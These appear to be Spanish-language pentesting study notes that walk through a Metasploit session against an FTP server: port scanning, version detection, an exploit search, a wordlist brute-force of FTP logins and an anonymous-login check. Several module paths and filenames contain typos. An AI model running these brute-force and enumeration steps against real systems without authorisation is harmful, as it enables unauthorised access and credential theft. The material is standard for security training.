Metaesploit cuenta con varios modulos auxiliares para enumerar y realizar fuerza bruta contra objetivos que ejecutan un servidor FTP 


```
msfconsole
msf6>workspace -a ftp_enum
msf6>search portscan
msf6>use 6
msf6 auxiliary(scanner/portscan/tcp)>show options
msf6 auxiliary(scanner/portscan/tcp)>set RHOST ip
msf6 auxiliary(scanner/portscan/tcp)>run
msf6>search ftp
msf6>search type:auxiliary name:ftp
msf6>use 24
msf6 auxiliary(scanner/ftp/ftp_version)>set RHOST ip
msf6 auxiliary(scanner/ftp/ftp_version)>run  #Nos da la version ProFTPD 1.3.5a
msf6 auxiliary(scanner/ftp/ftp_version)>search ProFTPD  #Buscar exploits de ProFTPD
msf6 auxiliary(scanner/ftp/ftp_version)>back
msf6>search type:auxiliary name:ftp
msf6>use auxiliary/scanner/ftp/ftp_login    #Modulo para realizar fuerza bruta en FTP
msf6 auxiliary(scanner/ftp/ftp_login)>show options
msf6 auxiliary(scanner/ftp/ftp_login)>set RHOST ip
msf6 auxiliary(scanner/ftp/ftp_login)>set USER_FILE /usr/share/metasploit-framework/data/worldlists/commun_user_list.txt
msf6 auxiliary(scanner/ftp/ftp_login)>set PASS_FILE /usr/share/metasploit-framework/data/worldlists/unix_passwords.txt
msf6 auxiliary(scanner/ftp/ftp_login)>run
msf6 auxiliary(scanner/ftp/ftp_login)>ftp ip   #nos logueamos con los pass obtenidos de la fuerza bruta
msf6 auxiliary(scanner/ftp/ftp_login)>back
msf6>search type:auxiliary name:ftp
msf6>use auxiliary/canner/ftp/anonymous   #Usa mudulo anonymous en ftp
msf6 auxiliary(scanner/ftp/anonymous)>set RHOST ip
msf6 auxiliary(scanner/ftp/anonymous)>run


```

Nos intentamos conectar desde la terminal 
```
root@asfsd>ftp ip
```
